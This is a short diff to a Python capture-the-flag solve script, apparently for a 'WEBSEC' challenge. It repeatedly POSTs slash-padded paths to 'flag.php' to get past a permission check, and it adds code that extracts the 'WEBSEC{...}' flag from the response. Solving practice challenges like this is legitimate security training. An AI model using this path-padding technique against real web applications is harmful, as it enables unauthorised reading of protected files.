@@ -12,9 +12,16 @@ for i in range (100000):
     r = post(url , data=data)
     
     if (r.text.find('Permission denied!') != -1):
-        print 'failed'
+        print ('failed')
         f = '.' + '/' * i + 'flag.php'
     else:
-        print 'success'
-        print r.text
+        pos = r.text.find('WEBSEC{')
+        while (True):
+            txt = r.text[pos]
+            print(txt , end='')
+            if (txt == '}'):
+                print()
+                break
+
+            pos += 1
         sys.exit()
